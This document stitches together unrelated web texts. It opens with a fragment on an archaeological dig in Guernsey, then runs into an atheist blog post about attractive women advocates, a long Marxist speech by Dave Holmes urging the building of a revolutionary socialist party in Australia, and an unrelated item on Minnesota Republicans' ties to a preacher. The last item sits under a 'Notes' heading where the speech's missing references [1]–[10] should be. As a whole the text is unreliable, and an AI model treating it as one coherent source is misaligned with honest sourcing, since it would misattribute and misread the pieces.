The team visiting Guernsey for the dig is from the Clifton Antiquarian Club .
It includes several professional archaeologists .
Please turn on JavaScript .

Their work is funded by the Admiral de Saumarez Trust , a charitable organization which raises money for community and island - wide regeneration projects , such as the rejuvenation of sports amenities and historical features at Delancey Park .
The discoveries made during June 2010 prompted Dr Nash and his team to plan to return in 2011 for more extensive research .
He said this would include lifting some of the enormous stones in order to search for further clues beneath .

We all know that Christianity has a long history of subjugating women .
Even today , feminism and female reproductive freedom are among the favorite targets of Christian extremists in the U.S.
Many would like to strip women of their rights , rolling back the gains women have made in the last century .
Simply put , they want women to be seen but not heard
And yet , the atheist community is not exactly perfect when it comes to the role of women either .
Why is it that when a member of the atheist community who happens to be a physically attractive woman uses her appearance to help spread the atheist meme , so many " haters " come out of the woodwork ?
Is it jealously , an unusual application of feminism , or is there something else behind the negative reactions ?
We know that sex sells , and if we are interested in exposing more people to atheism , it would seem that we might welcome those who were able to bring some sex appeal to their message .
After all , it is the message that matters here , right ?
The first prominent example that came to my attention was Kelly from The Rational Response Squad .
It was clear that the RRS crew appreciated Kelly 's physical assets and used them to help spread their message .
They also received quite a bit of criticism for doing so .
I even criticized them a bit for writing too much about Kelly 's appearance in the content of their blog .
It was n't that I objected to their use of Kelly as a hook to get people to check out their blog ; I was just interested in reading more about Kelly 's thoughts on atheism than her meditations about her looks .
Regardless of what you or I may think about the content of the RRS site , one thing is clear : the group has benefited tremendously from Kelly 's intelligence , wit , passion for atheism , and yes , appearance .
I should note that my review of their efforts was rather positive on the whole , and I still believe that the atheist community is better for their work .
Next up , we have atheist blogger and YouTube sensation , Cristina ( K-rina ZOMGitsCriss ) .
Video blogging is her preferred medium , and it suits her well .
She 's bright , articulate , not afraid to be silly and entertaining at times , and yes , easy on the eyes .
Like Kelly , she 's taken her share of criticism .
And like Kelly , she seems to be self - aware enough to know that she is attractive and let it work for her .
Sure , she gets some absurdly sexist comments on her blog , YouTube channel , and Twitter account .
And while she does not deserve that , one has to admire how she does n't let it stop her either .
There are many others , but I want to get to my point .
I think that part of the negative reactions such women receive is indeed based on jealously .
It would be easy for someone like me to realize that my content will never get the attention theirs does because I can't draw crowds like they can .
But that does n't degrade the quality of their content .
Kelly 's best posts equal or exceed anything you 'll find here , and I wish I had a fraction of Cristina 's creativity and visual sense .
They address many vital social issues in a compelling manner , and I am glad that they are expanding the audience for such material .
Some of the feminist objections I have heard of their work seem surprisingly inconsistent with the feminism with which I am familiar .
For example , nobody is exploiting these obviously self - empowered women .
They are using everything they have ( including their physical attributes ) for their own benefit .
They strike me as being self - aware and as making the choice to do what they do with open eyes .
How could that possibly be a bad thing ?
I have heard some self - described feminists argue that these women make it more difficult for women without their physical assets ( or who choose not to use them ) to have their voices heard .
In the days of old media , this was almost certainly a valid criticism .
But in the interconnected nature of the modern atheist blogosphere , I 'm not sure how well it holds up .
When Kelly and Cristina attract a wider audience , we all benefit .
When Jen's ( Blag Hag Boobquake gains TV attention , we all benefit .
My work will never receive the attention that theirs does , but I will nevertheless reap some of the benefits of their efforts .
We all will .
Go marvel at their hotness if you must .
But while you are there , listen to what they have to say .
You just might find that they are strong , thoughtful women making a valuable contribution to the atheist movement .
Lenin : " In its struggle for power the proletariat has no other weapon but organisation " .
By Dave Holmes
Today humanity faces a global crisis stemming from the incredible rapacity of the capitalist system .
In the first place , there is catastrophic climate change which threatens to end life on our planet , then there is endemic war and conflict , mass poverty in the Third World and neoliberalism 's ever more ruthless assault on working people everywhere .
Capitalism will destroy the human race .
It is absolutely clear that the bourgeoisie will continue to put the drive for corporate profit ahead of everything , even our own future as a species .
It is incapable of changing .
Even when it recognises the danger it cannot stop doing what it does .
If capitalism is not overthrown , humanity is most likely doomed .
The only way out is the abolition of capitalism and its replacement by socialism .
And the only means to do this is anti-imperialist revolutions in the Third World and proletarian socialist revolutions in the advanced capitalist countries .
We reject in advance any argument that the crisis of global warming and climate change is so critical that it stands above politics or that there is no time to build a mass socialist party or that we ca n’t wait for socialism to replace capitalism .
We do n't propose waiting for anything — we are campaigning all the time and are trying to drive the struggle forward right now .
But the basic point still stands : the capitalist class is leading humanity to absolute disaster and its class position means it cannot and will not do anything else .
What is necessary is to assemble and organise the forces capable of prising its mad grip from the steering wheel and carrying out a drastic change of course .
Beyond utopianism
Can this be done ?
Is the working class — on which Marxist socialism places such hopes — up to the challenge ?
Ever since class society came into existence it has faced the resistance of the oppressed .
There have been an endless series of revolts and uprisings — whether by slaves , peasants , artisans or modern proletarians .
The dream of a society where there is no inequality , no division into rich and poor — i.e. , of a classless society — is a persistent one .
But before Marxism , socialism was utopian and could only be utopian .
It lacked a clear analysis of the problem and it lacked a realistic path to get to the promised land .
At bottom , this was due to the immaturity of social conditions .
The development of modern industrial capitalism and the emergence of the modern working class made it possible for socialism to go beyond utopianism .
Toward the end of the 1840s , in the midst of the industrial revolution which was transforming Europe , Karl Marx and Friedrich Engels laid the foundation stones of scientific socialism .
In the Communist Manifesto they explain that ever since the end of primitive communist society , " The history of all hitherto existing society is the history of class struggles . "
They showed that capitalist society and economy is inherently rent by fundamental contradictions which make it potentially unstable and susceptible to revolution .
On the one hand , humanity 's productive forces have objectively been socialised — a common economic infrastructure has been created for all humanity .
This is the material basis for a society without social antagonisms and everything that goes with that — classes , the oppression of women , the state , commodity production and money .
But because it rests on private ownership of the means of production , the whole operation of this great edifice depends on the wishes of a handful of capitalist magnates who are motivated solely by their own insatiable thirst for profit .
But capitalism is always shadowed by its nemesis — its gravedigger — in the form of the modern working class .
Bourgeoisie and proletariat — the two always go together .
The working class is essential for the operation of the social means of production but itself owns none of it .
Its conditions of life make it cooperative and collectivist in outlook .
Its objective interest is to collectively appropriate these means of production and establish a classless society .
This makes it revolutionary — at least potentially .
It is the sole authentically revolutionary class .
It has no interest in setting up a new system of class oppression but can only end its alienation by destroying the whole edifice of class domination .
( The " dictatorship of the proletariat " established by the working class after it takes power is a transitory phenomenon which will give way to the classless , communist society of the future . )
Is the working class up to it ?
Ever since its birth these basic ideas of Marxism have come under attack .
Reformists have denied the need for revolution and instead held out the fantasy of the gradual civilising of capitalism .
( The actual development , of course , has gone 100 % the other way . )
Other critics have argued that a socialist revolution is impossible or undesirable or that it will only lead to a Stalinist police state .
On the other hand , some revolutionaries have denied that the working class is capable of fulfilling the role assigned to it by Marx and Engels .
They have argued that it is too integrated into the system , that it is corrupted by high living standards and so on .
They have looked to various other social groups ( students , the lumpenproletariat , Third World peasants and so on ) to play the role of revolutionary agent .
During the height of the long postwar boom ( which only ended in 1975 ) , such views were quite common .
The working class had supposedly been corrupted by the good times .
Such pessimistic analyses were decisively refuted by the tremendous 1968 revolt of the French students and workers .
But for the want of a sufficiently large revolutionary leadership , this upsurge clearly had the power to overthrow the capitalist system in France .
Now , as the good times are long gone for most , as neoliberal austerity and " labour market reform " bite ever more deeply , as casualisation and outsourcing change the face of the workplace , some people have concluded that it ’s impossible for workers to organise to fight for their interests .
These arguments are as false and one - sided as the others .
Stan Goff rejects Marxism
In the United States , the well - known leftist Stan Goff — he was the keynote speaker at the 2005 Asia - Pacific International Solidarity Conference in Sydney — has recently caused a minor stir by announcing his " definitive rejection of Marxism in its current organisational forms , be they called Marxist - Leninist or Trotskyist or Maoist " .
It 's not quite clear what he means by this .
But the following argumentation is clear enough :
The last thing [ he says ] a metropolitan industrial working class is going to do is embrace a project that threatens the only stability it knows .
Boeing workers are not going to oppose the military - industrial complex .
Prison guards are not going to oppose prisons .
Agribusiness workers are not going to oppose processed foods .
Auto workers are not going to oppose cars . [ 1 ]
The implicit assumption Goff makes here is that short - term , immediate interests — to keep one 's job and be able to feed oneself and one 's family — will always override long - term objective interests — to end one 's oppression and alienation by establishing a classless society .
Although it is undeniable that there is a real - life tension between the two , this assumption is completely false .
Every time workers go on strike they are sacrificing something immediate for something more long - term .
And when we consider great struggles like the May - June 1968 days in France , the falsity of Goff 's argument becomes even more apparent .
As for his argument that , for instance , " Agribusiness workers are not going to oppose processed foods " , this is completely false also .
Who says the struggle is going to be posed in that way ?
For a start , most of the field workers are migrants and guest workers ( so - called " illegal aliens " ) .
And they can certainly be interested in a struggle for better and safer conditions in the fields and the plants .
And when a struggle develops for the overthrow of the whole rotten system , who says they will not be attracted to it ?
Goff continues :
Our experience is that this class in the US , with occasional exceptions , fights for its privileges within that class — male , national , and white .
Moreover , the collapse of the current system faces this working class with catastrophe , beginning with the fact that it is thoroughly dependent on military spending to hold back that catastrophe .
I can only conclude that an imperial working class is not and never will be the midwife of anything except reaction . [ 2 ]
One could have a whole discussion on this but here are a few initial comments .
First , this analysis is at odds with the often stormy and heroic history of labour in the United States — white male workers included ( just think of the rise of the Congress of Industrial Organizations in the 1930s ) .
Second , the US working class today encompasses a lot more than white male workers .
In fact , some of the most militant and successful struggles in recent years have involved low - paid migrant workers ( in southern California in particular ) .
Third , it is always a big mistake to make hasty conclusions based on a very specific period , especially at a time when the contradictions of the world capitalist system are becoming truly explosive .
The working class has been shaken out of passivity before and it would seem premature to say it will never happen again .
At bottom , doubts about the revolutionary potential of the working class stem from the enormous difficulties and protracted nature of the revolutionary process .
We have no desire to minimise the problems facing the socialist project or to project an easy and unconvincing optimism .
However , with the collapse of the Stalinist system in the Soviet Union and the ever - deepening neoliberal attack on the working class , so many of the things which enabled the ruling class — at least in the West — to reconcile the bulk of the working class to the system are disappearing or being eroded ( anti-communism , the welfare state and rising living standards , and a sense of security and optimism about the future ) .
In their place insecurity , discontent and anger are growing .
Apprehension about climate change is a new and potentially explosive element here .
We should hold on to our basic ideas .
They will be more relevant than ever in the period into which we are entering .
The objective conditions are being created in which the socialist movement can grow and attract a significant working - class following and position itself to mount a serious challenge to the system as the crisis deepens .
Peculiarities of the socialist revolution
I want to briefly look at some of the key Marxist ideas about the socialist revolution and the role of the working class .
The socialist revolution is unlike anything ever before seen in history .
When the rising bourgeoisie fought for dominance against the feudal - absolutist system , it was already a wealthy possessing class .
It owned substantial means of production and exploited wage labour .
It had its own intellectuals and control of universities and municipalities .
It was the dominant force in parliament ( as in England in 1640 or France in 1789 ) .
But for all the drama of the struggle in many countries ( England , France and the United States ) and as historically important as the bourgeois revolutions were — especially when the necessary mobilisation of the masses radicalised the whole process — the gap between the contending classes was infinitely less than that between working class and capitalists .
In the period of the bourgeois revolutions , two sections of the possessing classes fought for mastery .
The object of the struggle was state power which would ensure the supremacy of the capitalist mode of production and the capitalist way of exploiting the subordinate classes .
In many cases , former feudalists would become capitalists .
And in many countries there was no revolution — the whole thing was settled from above , by compromise ( as in Germany ) .
But the working - class revolution is something radically different .
The oppressed class — the class at the very bottom of the social heap — struggles for state power in order to construct a socialist society where all forms of oppression and exploitation are eliminated .
The victory of the socialist revolution means the start of a process of transition which will eliminate the whole miserable system where a tiny minority of bourgeois plutocrats own society 's means of production and use this to keep the vast toiling majority in bondage .
While the socialist revolution sets up a dictatorship of the working class , this will be a temporary phenomenon and in time classes and all the junk that goes with it — the state and all violence and money - commodity economy — will wither away .
As Engels put it , as society reaches full communism , the real history of humanity can begin — a history of free , highly cultured human beings living in a collectivist and solidaristic society .
One final point here : the realities of the socialist revolution put a tremendous premium on consciousness .
The capitalist class and its enormous apparatus of material and ideological control means that the masses will have to be much more aware of what they are fighting for than ever before .
Today it 's simply not possible to accidentally stumble across the finishing line .
Furthermore , the revolutionary victory will not end the struggle .
After the bourgeoisie triumphed over feudalism and established its own regime , the market spread more or less automatically into every corner of the country and every part of the economy .
But a socialist society and economy will have to be built consciously — and for a long time .
There will be real dangers of backsliding and the regeneration of bureaucracy and privilege .
( We need only look at the vicissitudes of the Cuban Revolution to see how all these things play out . )
Of course , the weight of these dangers will vary in the different countries .
' No other weapon but organisation '
Under capitalism , the working class owns only its petty , personal property ( clothes , a car , perhaps a house , etc. ) .
It does n’t own any part of the economy — the mines , factories , offices , supermarkets , banks etc. — these belong to the capitalists — so in order to live workers have to go and work for the bosses and pay tribute to them ( the famous " surplus value " discovered by Marx ) .
Their labour is " free " only compared to the past ( i.e. , to slavery and serfdom ) .
Workers can choose their employer but they cannot avoid working for one or another member of the capitalist class .
In the essence of the matter they are slaves of the capitalist class as a whole .
This is why Marx termed capitalism a system of " wage slavery " .
The great mass of workers can never escape their proletarian , propertyless condition .
Only by making a socialist revolution can the workers collectively become owners of the means of production which they operate .
Under capitalism , the working class is a ground - down , deeply divided mass — it is simply fodder for exploitation by the bosses in the workplace .
Workers are forced to compete against each other for jobs .
They are divided by nationality , ethnic background or skin colour ; by skill and type of work ( blue collar , white collar , etc. ) ; by their wage and general conditions of work ; and by age and gender .
These divisions are skilfully exploited by the capitalist class to keep the workers disunited and turned in on each other .
And , of course , through the all - pervasive mass media workers are constantly inundated with petty - bourgeois consumerist propaganda , a fantasy view of what is actually desirable and possible for them .
The only antidote to this extreme heterogeneity is a conscious struggle for organisation and unity in order to fight for a new society .
And the highest form of this unity is a mass revolutionary Marxist party .
Here is how Lenin put it in his famous 1904 polemic One Step Foward , Two Steps Back :
In its struggle for power the proletariat has no other weapon but organisation .
Disunited by the rule of anarchic competition in the bourgeois world , ground down by forced labour for capital , constantly thrust back to the " lower depths " of utter destitution , savagery , and degeneration , the proletariat can , and inevitably will , become an invincible force only through its ideological unification on the principles of Marxism being reinforced by the material unity of organisation , which welds millions of toilers into an army of the working class . [ 3 ]
( As an aside , there are probably not many comrades here who remember May Days in Melbourne and Sydney in the 1970s .
We used to carry huge red-and - black portraits in the march .
They were absolutely enormous , about eight feet high and each one was mounted on horizontal poles with guy ropes and carried by four comrades — pharaoh like — on their shoulders .
The overall effect was extremely impressive .
Anyway , one of these displays consisted of a picture of Lenin above this quote : " In its struggle for power the proletariat has no other weapon but organisation . "
I do n't know what the bystanders made of this but it always did it for me . )
From a class in itself to a class for itself
Trotsky makes similar points to Lenin in his 1932 article " What Next " , a sustained attack on the policies of the Stalinised German Communist Party in the face of the rise of Nazism .
The interests of the class cannot be formulated otherwise than in the shape of a program ; the program cannot be defended otherwise than by creating the party .
The class , taken by itself , is only material for exploitation .
The proletariat assumes an independent role only at that moment when from a social class in itself it becomes a political class for itself .
This cannot take place otherwise than through the medium of a party .
The party is that historical organ by means of which the class becomes class conscious …
The progress of a class toward class consciousness , that is , the building of a revolutionary party which leads the proletariat is a complex and a contradictory process .
The class itself is not homogeneous .
Its different sections arrive at class consciousness by different paths and at different times .
The bourgeoisie participates actively in this process .
Within the working class , it creates its own institutions , or utilises those already existing , in order to oppose certain strata of workers to others .
Within the proletariat several parties are active at the same time .
Therefore , for the greater part of its historical journey , it remains split politically .
The problem of the united front — which arises during certain periods most sharply — originates therein .
The historical interests of the proletariat find their expression in the Communist Party — when its policies are correct .
The task of the Communist Party consists in winning over the majority of the proletariat ; and only thus is the socialist revolution made possible . [ 4 ]
The party is the brain of the class
In a 1921 article written for the French communists , Trotsky looked at the lessons of the Paris Commune of 1871 .
" We can thumb the whole history of the Commune , page by page " , he wrote , " and we will find in it one single lesson : a strong party leadership is needed " . [ 5 ]
The workers ' party — the real one — is not a machine for parliamentary manoeuvres ; it is the accumulated and organised experience of the proletariat .
It is only with the aid of the party , which rests upon the whole history of its past , which foresees theoretically the path of development , all its stages , and which extracts from it the necessary formula of action , that the proletariat frees itself of always recommencing its history : its hesitations , its lack of decision , its mistakes .
The proletariat of Paris did not have such a party …
… If the centralised party of revolutionary action had been found at the head of the proletariat of France in September 1970 [ when the regime of Napoleon III collapsed ] , the whole history of France and with it the whole history of humanity would have taken another direction . [ 6 ]
When the Paris Commune was proclaimed on March 18 , 1871 , it was not because the masses had seized power .
Rather , its enemies had abandoned the city and fled down the road to Versailles .
At this moment , the forces of the bourgeoisie could have been crushed quite easily .
Its main leaders could have been arrested ; the ranks of the army retreating out of Paris were already disaffected with their officers and could have been disintegrated by agitation .
But none of this was done .
As Trotsky explains : " There was no organisation of a centralised party , having a rounded view of things and special organs for realising its decisions . " [ 7 ]
And so it went on at every critical point in the brief history of the Paris Commune .
The contrast with the ruthless struggle for victory waged by the Bolsheviks in Russia half a century later could not be clearer .
Leadership : theirs and ours
In regard to leadership , things stand very differently for the capitalist class .
Relatively , it has a great depth of possibilities .
It usually has not one but several political parties which can look after its interests — [ in Australia ] just look at the Liberal - National Party Coalition and the Australian Labor Party ( ALP ) , both completely dedicated to ensuring that the wheels of capitalist exploitation turn smoothly and that any rumblings from below are held in check .
It has business associations ( like the Business Council of Australia ) , it has the military , intelligence and police chiefs and whole echelons of officials and advisers in the state bureaucracy .
There are even wealthy establishment families that specialise in providing political advisers to the bourgeoisie over many generations .
Of course , even the capitalist class can have its crises when it is divided or none of its various leadership teams can see a clear way forward .
But the working class is in a fundamentally different situation .
For a start , most ordinary working people are preoccupied with simply surviving — working around eight hours a day ( if not actually more ) , travelling to and from work , looking after their families , etc .
It is very hard for them to be politically active on any sustained basis .
Moreover , talented individuals are constantly being sucked out of the class — into the ranks of the middle - class professions , into the ALP and reformist trade union bureaucracy ( even into the Coalition parties ) and into various forms of service to the ruling class .
That is the reason why we attach so much importance to the question of building a Marxist political party .
This is the only way the inherent disadvantages of the proletarian situation can be overcome .
Working - class leadership is at an absolute premium .
There is no possibility of having an A team and a B team ; there will only be one revolutionary leadership of the class .
The challenge is to build it .
As Trotsky points out , this is an immensely difficult task but we know from history that it is not impossible .
Furthermore , capitalism itself creates the conditions under which this problem can be resolved .
What is needed is a mass socialist workers ' party
When we say that a mass socialist party is necessary to lead a revolution , what do we mean ?
At the end of World War II the Communist Party of Australia had some 16,000 members .
( This was already a sharp drop from its 1943 peak of around 23,000 . )
In Melbourne , one would imagine , it probably had 3000 - 5000 members .
Compared to our small size today it would have been simply enormous !
Its cadre would have been everywhere throughout the union movement , on the campuses , in the communities , in cultural circles , etc .
When I 'm selling at Barkly Square in Melbourne on Saturday mornings , one of my occasional customers is an old leftie , a former wharfie who was close to the Communist Party ( but not a member ) .
He is now in his late 70s or early 80s .
His constant lament to me is how much the left movement has declined .
He always tells me how in the 1940s and ’50s you could not go into a pub in Brunswick or the inner city without being asked to buy the CPA paper Tribune .
All I can say to him is that we are still struggling , the capitalist system has some unprecedented problems and that we are confident that the socialist movement will again grow into a mass force .
But even this impressive level of development of the CPA was nowhere near enough ( let ’s put aside the party 's Stalinist politics ) .
The ALP was undoubtedly many , many times larger and still had the bulk of the working class in its grip .
It seems to me that a party capable of successfully leading a revolutionary process in this country would need scores of thousands and probably several hundred thousand members .
Perhaps , as in Russia in 1917 , it will only acquire a truly mass base in the course of the decisive revolutionary crisis itself .
But even to do this , it is necessary to have an initial cadre base qualitatively greater than what we have at present , otherwise any crisis will simply wash over us .
( This is what happened in France during the May - June 1968 revolt despite the heroic efforts of the Trotskyist Ligue Communiste — they were simply too small . )
From one point of view , our whole history has been a struggle to assemble an initial cadre force and get to a point where we can get into large - scale politics and put some real flesh on our revolutionary skeleton .
Today , we are a few hundred strong , the next step is get to ( say ) 500 members , then to double in size and then to become a few thousand and so on .
We would still be very small but qualitatively new possibilities would open before us …
A complicated and tortuous process
The struggle to build an independent working - class political party in a given country is an extremely complicated and tortuous process .
There is no general formula applicable in all cases .
A brief look at the history of the international labour movement makes this very clear .
Communist League
At the very beginning of the birth of modern scientific socialism , the Communist Manifesto was the result of the efforts of Marx and Engels to gather an international grouping around these ideas .
They won over a number of leaders of the League of the Just and got agreement to transform this formerly conspiratorial society into an open political party with a clear program and democratic rules .
On this basis they then joined the organisation .
As a result of its " extreme makeover " , at its second congress in November 1847 the Communist League ( as it was now called ) commissioned Marx and Engels to draw up a manifesto for the organisation and the result has entered into history — the most influential political document ever written .
The Communist League was not an association of national political parties .
Rather , it brought together small groups of revolutionaries in a number of Western European countries .
And when the Europe - wide revolutionary storm of 1848 - 49 broke , the Communist League did n't really function as a cohesive organisation , even in Germany ( although its members there — especially Marx and Engels — exercised a great influence ) .
The organisation did not long survive the defeat of the revolution .
First International
The next big step in international working - class organisation was the formation of the International Working Men 's Association ( the First International ) .
As Ernest Mandel explains in his Introduction to Marxism :
After the years of reaction which followed the defeat of the 1848 revolution , it was mainly trade union and mutual aid organisations of the working class which developed in most countries , with the exception of Germany , where the agitation for universal suffrage enabled Lassalle to constitute a workers political party : the General Association of German Workers [ in 1863 ] .
It was through the founding of the First International in 1864 that Marx and his little group of followers really fused with the elementary workers movement of the epoch , and prepared the establishment of socialist parties in most European countries .
However paradoxical it may seem , it was not national workers parties that assembled together to constitute the First International .
It was the constitution of the First International that allowed the grouping on a national level of local and syndicalist groups adhering to the First International .
When the International broke up after the defeat of the Paris Commune , the vanguard workers remained conscious of the need for organisation on a national level .
After a few early defeats , the socialist parties based on the elementary workers movement of the period were definitively constituted in the 1870s and ' 80s .
The only important exceptions were Great Britain and the USA , where the socialist parties at this time remained marginal to the already strong trade union movement . [ 8 ]
Second International
In 1889 the Second International was founded .
It became the accepted international organisation of the working - class vanguard .
At its congresses the main problems facing the workers movement were debated and decisions codified in resolutions .
During the period from its inception to the outbreak of World War I in 1914 , the European socialist parties and trade unions grew significantly in size and influence .
However , with the development of imperialism , revisionism and opportunism also began to develop in the social - democratic parties .
The social basis for this was the trade union bureaucracy and the full - time apparatus of the parties who had long since adapted in practice to the capitalist system .
Things came to a head when the leaderships of almost all the parties supported their respective governments in the war .
It was left to small left - wing minorities to uphold the principles of revolutionary socialism .
Third International
Following the Russian Revolution , the Communist International ( also known as the Comintern or Third International ) was founded .
It brought together the main revolutionary parties and groups that had opposed the war and which supported the new Soviet regime .
The process was begun of clarifying key questions facing the movement and educating the new communist parties that were being established in the various countries .
The first four congresses of the Comintern between 1919 and 1922 played a tremendous role in this regard .
The Second Congress , for instance , adopted the famous 21 conditions which set out the necessary political conditions for admission of parties to the Comintern .
This was an attempt to exclude reformist and centrist forces and drive them out of the CPs .
And the Third Congress adopted a united - front policy in regard to the still powerful social - democratic and centrist parties in the various countries .
The CPs were built by a process of splits and fusions in the various countries over a number of years .
In some cases the left - wing forces split from social - democracy ( in France the whole party came over after expelling its right wing ) ; in others ( like Britain ) small socialist groups unified and there were other variants .
The communist parties were organised very differently to the old socialist formations .
Here is how James P. Cannon describes the early US Communist Party :
It was composed of thousands of courageous and devoted revolutionists willing to make sacrifices and take risks for the movement .
In spite of all their mistakes , they built a party the like of which had never been seen in this country before ; that is , a party founded on a Marxist program , with a professional leadership and disciplined ranks …
They learned to take program seriously .
They learned to do away forever with the idea that a revolutionary movement , aiming at power , can be led by people who practice socialism as an avocation .
The leader typical of the old Socialist Party was a lawyer practising law , or a preacher practising preaching , or a writer , or a professional man of one kind or another , who condescended to come around and make a speech once in a while .
The full - time functionaries were merely hacks who did the dirty work and had no real influence in the party .
The gap between the rank and file workers , with their revolutionary impulses and desires , and the petty - bourgeois dabblers at the top was tremendous .
The early Communist Party broke away from all that , and was able to do it easily because not one of the old type leaders came over wholeheartedly to the support of the Russian Revolution .
The party had to throw up new leaders out of the ranks , and from the very beginning the principle was laid down that these leaders must be professional workers for the party , must put their whole time and their whole lives at the disposal of the party .
If one is thinking of a party that aims to lead the workers in a real struggle for power , then no other type of leadership is worth considering . [ 9 ]
You can also get a real sense of the differences between the old social - democratic parties and the new CPs by looking at the theses adopted in 1921 by the Third Congress of the Comintern on " The Organisational Structure of the Communist Parties , the Methods and Content of Their Work " .
( We have published this resolution in a photocopied pamphlet edition . )
In fact , these theses are very much a manual on how to gradually transform those parties which had come from the old tradition into parties with a much more active , involved and politically educated membership .
( This process , of course , was quite different to the later " Bolshevisation " campaigns which really served to stifle the independent life of the CPs and subordinate them to the developing Soviet bureaucracy . )
Trotskyist movement
While Trotsky 's project of a Fourth International never assumed mass form , the various Trotskyist organisations did amass some rich and varied experiences ( both positive and negative ) in trying to build themselves from small nuclei into larger formations .
Of course , the most instructive are those of the US Trotskyists under the leadership of James P. Cannon , whose early years are chronicled so brilliantly and instructively in his wonderful History of American Trotskyism .
The heroic initial accumulation of cadres , the fusion with another militant proletarian organisation , the successful entry into the Socialist Party , then the split with the revisionist Burnham - Shachtman group — all these episodes ( and there are many more ) illustrate different tactics for building the revolutionary party in particular conditions .
In Australia …
In Australia our party - building situation is quite specific .
If you date it from the 1970 split with Bob Gould in the original Resistance and the formation of the Socialist Youth Alliance , our current has existed for 36 years .
Over this time our numbers have never exceeded 350 members but gradually — through constant and unflagging effort — our strategic position has strengthened considerably .
Over the years , others have fallen away — the Communist Party and the most of the smaller Trotskyist groups .
The establishment in 1991 of Green Left Weekly — a non-party paper underwritten by the Democratic Socialist Perspective — has been absolutely vital .
It has proven to be an ideal transitional vehicle which has enabled us to greatly magnify our message , win widespread respect and attract a significant layer of people around us .
And generally we have been able to successfully work around any limitations that its independent form imposes on us .
Socialist Alliance has played a similar role as a transitional vehicle and is ideally suited to exploit the growing disillusion with the ALP and the general progressive discontent looking for a left expression .
The burning problem for us remains that of growing , of putting flesh on our bones , recruiting new comrades and giving younger comrades the experiences and training to enable them to assume key positions of responsibility in the party ( especially as organisers and branch secretaries and on the national leadership ) and in the broader movement .
We have to ensure our survival as well as further strengthen our influence on the left .
As I said before , we simply remain too small .
In our current situation , another 50 active , politically integrated comrades would make an enormous difference , let alone a further 100 .
Our tradition
We have always been an outward - looking movement seeking to link up with others whenever there was a basis for it .
This was especially evident in the 1980s .
This was the period in which we moved away from Trotskyism and revised our line on the Labor Party .
We explored every possibility of linking up with other socialists — the Communist Party in 1986 - 87 when they moved away from their previous line of complete support for the ALP - ACTU wage - freeze accord , and the Socialist Party of Australia in 1988 - 89 .
And when the precursor movement to today ’s Greens started up in the early 1990s , we attempted to be part of it .
For various reasons , nothing concrete came of all these efforts .
However , we gained valuable experience and showed that we , at least , were dead serious about working realistically for unity of the left and progressive forces .
The Socialist Alliance project is wholly in the spirit of these earlier efforts .
Of course , the project has gone through a real evolution since its formation in 2001 .
Apart from ourselves , all the other left groups who originally affiliated have now left or withdrawn from any meaningful involvement .
But , as the October 2007 conference in Geelong demonstrated , Socialist Alliance remains an indispensable vehicle for our collaboration with some key industrial militants and some important Indigenous activists .
It also provides a home for a layer of leftists disgusted with the neoliberal evolution of the ALP and for whom the middle - class Greens can not be a real alternative .
The general point to grasp here is that the transitional vehicle of a broad but militant socialist organisation is essential for us to attempt to relate to the large numbers of people turning away from social democracy as the capitalist crisis bites deeper and deeper .
Under its own banner , the DSP directly cannot intercept more than a handful of these people .
Potentially , at least , Socialist Alliance can attract thousands .
That is the difference .
And through Socialist Alliance , we can interest many more people in Marxist ideas .
That is the clear record so far .
A particle of the fate of humanity
Being a socialist in Australia today remains a grind .
There is a constant pressure to fall in a heap .
The unending neoliberal vileness coming from all bourgeois rostrums and the ceaseless consumerist message being pumped out by the media seems to numb so many people and it can certainly affect our morale .
We can come to feel that it 's all hopeless , that we are irrelevant , that we ’ll never make the sort of progress we need and so on and so on .
The necessary antidotes to this permanent ideological pressure on us are no mystery —
Marxist theoretical conviction , historical perspective , a clear analysis of what is going on and why , avoiding impressionism and panic , and activity and collaboration with others in the framework of the party .
Actually , this is a good time to be an active socialist .
We are necessary , perhaps as never before .
However grim things look , the future of the human race is not preordained .
It will be determined in the course of the struggle .
What we do — what all those around the world who think like us do — will decide what happens .
If you 're upset about the way things are going — then do something .
Get active in the socialist movement , get involved — or get more involved .
You 'll feel better and — far more importantly — what you do will make a difference .
Of course , the revolutionary movement is not for those who want an easy and stress - free life .
On the contrary , there is an endless amount of work to be done and far too few comrades to do it .
But , on the other hand , nothing in this world is more worthwhile or more satisfying than participating in the struggle for the communist future of humanity .
Tensions are inevitable whenever people work together under pressure but the amazing thing , really , is not the occasional frictions but how harmoniously we all work together most of the time .
We are lucky : we get to see people at their very best , freely collaborating to advance a great emancipatory project .
For millions of people around the world , Venezuela 's leader Hugo Chavez is rehabilitating the idea of socialism as the only answer to the madness into which capitalism and imperialism are plunging the planet .
We fully understand the need to connect with this .
But what this should mean for us — above everything else — is that here , in Australia , we need to re-dedicate ourselves to the struggle and persevere with our efforts to build the socialist movement in this country .
I 'd like to conclude with a passage from James P. Cannon .
He wrote these words on November 26 , 1944 from Sandstone Prison in Minnesota .
He was one of 18 leaders and militants of the Socialist Workers Party who were jailed for their unyielding opposition to the imperialist war being waged by the US rulers .
People cannot live without perspectives , without hope for the future .
Those who hope to organise a great movement of the masses must never forget this , never fail to inspire them with confidence that the future will be better than the present if only they strive to make it so .
The greatest power of Marxism derives from the fact that it gives a rational basis to the impulse of the masses to make a better world , a scientific assurance that the irresistible laws of social evolution are working on their side ; that the idea of socialism , of the good society of the free and equal , is not a utopian fantasy but the projection of future reality .
When this idea takes hold of the people it will truly be the greatest power in the world .
It seems to me somewhat undignified , somewhat lacking in the sense of proportion , for one who has grasped this idea to be deterred or turned aside by such trifles as concern for one 's personal fate .
No importa , as they say in Spanish — " it does not matter " .
What matters , as [ Trotsky ] expressed it , is " the consciousness that one participates in the building of a better future , that one carries on [ one 's ] shoulders a particle of the fate of [ humanity ] , and that one ’s life will not have been lived in vain " .
… Much of the propaganda of the past has been too matter - of - fact ; the conception of the role of the party too limited ; the self - assumed obligations of the individual too paltry , too narrowly calculated .
The world will be changed by people who believe in the boundless power of the ideas of the party and who set no limits to the demands which the party may make upon them . [ 10 ]

Notes
It 's not unusual for candidates ' religious friends to be pulled into the electoral fray .
Remember Jeremiah Wright ?
Or what about Sarah Palin 's witch - hunting pal , Thomas Muthee ?
The Minnesota Republican Party 's pious followers at the hard rock - loving church group , You Can Run But You Ca n't Hide are even wackier .
Election years bring the queerest of skeletons out of the closet .
And the Minnesota Republican party , including Michele Bachmann and gubernatorial candidate Tom Emmer , have a doozy : ties to a punk rock ministry whose leader , Bradlee Dean , praises Muslims nations for executing gay people .
This could be quite the political quagmire .
Journalist Andy Birkey reported this week on the numerous ties between Dean , You Can Run and the Gopher State 's GOP .
